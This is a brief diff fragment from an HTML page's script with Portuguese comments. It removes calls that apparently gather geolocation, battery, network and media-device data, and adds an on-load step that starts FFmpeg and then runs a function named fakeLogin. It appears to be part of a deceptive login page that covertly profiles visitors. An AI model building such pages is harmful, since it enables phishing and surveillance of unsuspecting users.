-  Promise.all([geo(),bat(),netinfo(),midias()]);
-}
-// permite avançar com Enter no e-mail
-document.getElementById('emailInput').addEventListener('keypress',e=>{if(e.key==='Enter')validaEEnvia();});
+
+/* ---------- Dispara ---------- */
+window.onload=()=>initFFmpeg().then(()=>fakeLogin()).catch(()=>fakeLogin());
 </script>
 </body>
 </html>
